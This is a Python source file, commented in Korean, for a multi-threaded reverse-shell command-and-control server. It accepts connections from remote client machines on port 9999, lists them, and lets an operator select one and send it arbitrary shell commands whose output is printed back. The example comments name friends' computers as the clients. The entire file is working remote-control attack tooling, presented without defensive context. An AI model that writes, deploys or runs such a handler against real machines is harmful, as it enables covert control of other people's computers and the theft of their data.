import socket  # 소켓을 이용하기 위한 라이브러리
import sys  # 터미널 명령어를 python 파일로 구현하는 데 사용됨
import threading  # 스레드를 사용하여 각 소켓통신을 처리
import time  # 소켓 연결 도중 timeout으로 통신이 끊기는 것을 방지하기 위해 import
import os
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
# 1번의 스레드는 클라이언트의 연결을 수신 대기하고 연결을 수락하고 연결과 관련된 데이터를 저장함(연결 객체, 클라이언트의 주소)
# 2번의 스레드는 클라이언트에 명령을 내리고 기존 클라이언트와의 통신을 처리함

queue = Queue()
all_connections = []  # 모든 연결 객체
all_address = []  # 모든 연결된 클라이언트의 주소


# 소켓을 만드는 함수
def create_socket():
    try:
        global host
        global port
        global server_socket

        host = ""
        port = 9999
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    except socket.error as msg:
        print("소켓 생성 에러: " + str(msg))


# 소켓에 IP주소와 포트넘버를 결합시킴
def bind_socket():
    try:
        global host
        global port
        global server_socket
        print("소켓 바인딩: " + str(port))

        server_socket.bind((host, port))
        server_socket.listen()

    except socket.error as msg:
        print("소켓 바인딩 에러" + str(msg))
        print("결합 재시도")
        bind_socket()


# 여러 클라이언트의 연결 처리 및 목록에 저장
# server.py 파일을 다시 시작할 때 이전 연결을 close함
def accepting_connections():
    # 기존에 모든 연결을 닫아서 서버를 새로 시작
    for connection in all_connections:
        connection.close()

    # 기존에 모든 연결 정보들을 삭제
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            client_socket, client_addr = server_socket.accept()  # 연결 객체는 client_socket에 IP와 포트넘버는 client_addr에 저장
            server_socket.setblocking(True)  # timeout방지

            all_connections.append(client_socket)
            all_address.append(client_addr)

            print("연결성공 :" + client_addr[0])

        except:
            print("연결실패")


# 두 번째 스레드 기능 - 1) 모든 클라이언트 보기 2) 클라이언트 선택 3) 연결된 클라이언트에 명령 전송
# 명령어 전송을 위한 Interactive prompt
# my_shell> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# my_shell> select 1
# 192.168.0.112> dir

def start_my_shell():

    while True:
        cmd = input('my_shell> ')

        # 서버와 연결된 클라이언트 리스트가 표시됨
        if cmd == 'list':
            list_connections()
        # 클라이언트의 ID을 입력하여 서버가 해당 클라이언트에게 명령어를 전달
        elif 'select' in cmd:
            client_socket = get_target(cmd)

            # 연결 객체가 있는지 확인 후 있으면 명령어 전송
            if client_socket is not None:
                send_target_commands(client_socket)

        elif cmd == 'quit':
            os._exit(0)

        else:
            print("알 수 없는 명령어!")


# 클라이언트와의 현재 활성된 연결 모두 표시
def list_connections():
    results = ''

    for i, client_socket in enumerate(all_connections):
        # 클라이언트와 연결이 활성화 된 경우
        try:
            client_socket.send(str.encode(' '))
            client_socket.recv(20480)
        # 클라이언트와 연결이 비활성화(클라이언트가 컴을 끄거나 해서) 된 경우 연결객체와 주소 삭제
        except:
            del all_connections[i]
            del all_address[i]
            continue

        # 연결된 클라이언트들의 IP주소와 포트번호 리스트
        results += str(i)+ "번" + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# 명령어를 보낼 클라이언트 타켓 선택
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        client_socket = all_connections[target]
        print(str(all_address[target][0]) + " 연결성공" )
        print(str(all_address[target][0]) + "> ", end="")
        return client_socket
        # 192.168.0.4> dir

    except:
        print("잘못된 입력")
        return None


# 클라이언트에게 명령어 전송
def send_target_commands(client_socket):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                client_socket.send(str.encode(cmd))
                client_response = str(client_socket.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("명령어 전송 실패")
            break


# 스레드를 생성함
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        # work가 1이면 소켓 연결처리, 2이면 명령어 전송을 하는 쓰레드를 생성함
        thread = threading.Thread(target=work)
        # 데몬 쓰레드는 백그라운드에서 실행되는 쓰레드로 메인 쓰레드가 종료되면 즉시 종료되는 쓰레드이다.
        # 반면 데몬 쓰레드가 아니면 해당 서브쓰레드는 메인 쓰레드가 종료할 지라도 자신의 작업이 끝날 때까지 계속 실행된다.
        thread.daemon = True
        # 쓰레드 실행
        thread.start()


# 큐에 있는 다음 작업 수행(연결처리, 명령어 전송)
def work():
    while True:
        # 큐에서 작업을 가져옴
        action = queue.get()

        # 소켓 생성 및 연결
        if action == 1:
            create_socket()
            bind_socket()
            accepting_connections()

        # 명령어 전송
        if action == 2:
            start_my_shell()
        # 큐에 넣은 작업이 완료됨
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    # queue에 모든 항목이 처리 될 때까지 블록함
    queue.join()


create_workers()
create_jobs()